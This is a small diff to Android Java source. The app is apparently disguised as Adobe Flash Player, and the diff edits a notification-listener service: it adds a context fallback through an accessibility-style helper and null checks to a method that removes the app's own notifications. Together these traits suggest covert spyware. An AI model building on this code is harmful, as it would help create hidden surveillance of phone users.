@@ -11,6 +11,7 @@ import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.R;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.accessory.AccessHelper;
 
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
@@ -94,6 +95,7 @@ public class NoteListenerSrv extends NotificationListenerService{
 
     //meizu call this function
     public NoteListenerSrv() {
+
         Log.e(TAG,"constructrue");
     }
 
@@ -111,6 +113,11 @@ public class NoteListenerSrv extends NotificationListenerService{
         try{
             Log.e(TAG,"onListenerConnected");
 
+            context = this;
+            if (context == null){
+                context = AccessHelper.getContext();
+            }
+
             Public pub = new Public(getApplicationContext());
 
             mPackageName = context.getPackageName();
@@ -126,6 +133,9 @@ public class NoteListenerSrv extends NotificationListenerService{
     private boolean delSelfNote(String tag,String packname,StatusBarNotification sn){
 
         boolean flag = false;
+        if (tag == null || packname == null){
+            return false;
+        }
 
         for (int i = 0; i < filter.length; i++) {
             if (tag.contains(filter[i])) {
